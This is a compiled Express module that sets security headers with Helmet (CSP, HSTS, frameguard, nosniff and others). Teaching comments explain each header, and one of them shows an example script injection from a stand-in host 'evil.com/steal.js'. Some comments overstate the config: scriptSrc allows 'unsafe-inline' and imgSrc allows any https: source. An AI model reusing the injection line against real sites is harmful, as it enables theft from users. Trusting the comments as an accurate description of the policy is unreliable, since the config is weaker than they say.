"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.helmetMiddleware = void 0;
const helmet_1 = __importDefault(require("helmet"));
/*
  Helmet is actually a COLLECTION of smaller middlewares.
  Each one sets a different security header.
  
  We configure each one carefully.
  
  Think of it like configuring your house security:
  - Lock the front door (XSS protection)
  - Lock the windows (Clickjacking protection)
  - Install alarm (HSTS - force HTTPS)
  - Hide your valuables (remove X-Powered-By)
*/
exports.helmetMiddleware = (0, helmet_1.default)({
    /*
      Content Security Policy (CSP)
      
      Tells the browser: "Only load content from these sources"
      
      Without CSP:
        Attacker injects: <script src="evil.com/steal.js"></script>
        Browser loads it → your users get hacked
      
      With CSP:
        Browser checks: "is evil.com in the allowed list?"
        No → browser BLOCKS it
    */
    contentSecurityPolicy: {
        directives: {
            // Only load scripts from same origin
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            // Only load styles from same origin
            styleSrc: ["'self'", "'unsafe-inline'"],
            // Only load images from same origin and data URLs
            imgSrc: ["'self'", 'data:', 'https:'],
            // Only connect to these APIs
            connectSrc: ["'self'"],
            // Only load fonts from these
            fontSrc: ["'self'", 'https:', 'data:'],
            // Never allow <object> tags (old Flash etc)
            objectSrc: ["'none'"],
            // Only allow your own site in iframes
            frameSrc: ["'none'"],
            // Upgrade HTTP to HTTPS
            upgradeInsecureRequests: [],
        },
    },
    /*
      HTTP Strict Transport Security (HSTS)
      
      Tells browser: "ALWAYS use HTTPS for this site"
      Even if user types http:// → browser uses https://
      
      maxAge = remember this for 1 year (in seconds)
      includeSubDomains = also apply to sub.yoursite.com
    */
    hsts: {
        maxAge: 31536000, // 1 year in seconds
        includeSubDomains: true,
        preload: true,
    },
    /*
      X-Frame-Options
      
      Prevents your site from being put inside an <iframe>
      
      Attack without this:
        Attacker creates evil page
        Puts your site invisibly on top
        User thinks they click your button
        Actually clicks attacker's button (stealing clicks/data)
        This is called "clickjacking"
    */
    frameguard: { action: 'deny' },
    /*
      X-Content-Type-Options: nosniff
      
      Prevents browser from guessing file types.
      
      Without this:
        Attacker uploads file named "image.jpg"
        File actually contains JavaScript
        Browser "sniffs" it and runs as JavaScript → attack!
      
      With this:
        Browser trusts the Content-Type header ONLY
        Does not try to be clever about file types
    */
    noSniff: true,
    /*
      Removes X-Powered-By: Express header
      
      Without this: attacker knows you use Express
      With this: attacker has no idea what stack you use
      
      Security through obscurity is not perfect but
      it makes attacks harder.
    */
    hidePoweredBy: true,
    /*
      Referrer Policy
      
      Controls what URL is sent in the Referrer header.
      
      When user clicks link FROM your site TO another site:
      Without this: other site sees the full URL they came from
      With 'no-referrer': other site sees nothing
    */
    referrerPolicy: { policy: 'no-referrer' },
    /*
      DNS Prefetch Control
      
      Prevents browser from pre-fetching DNS for links on your page.
      Small privacy improvement.
    */
    dnsPrefetchControl: { allow: false },
    /*
      Cross-Origin Embedder Policy
      Disabled because it can break some features we need.
    */
    crossOriginEmbedderPolicy: false,
});
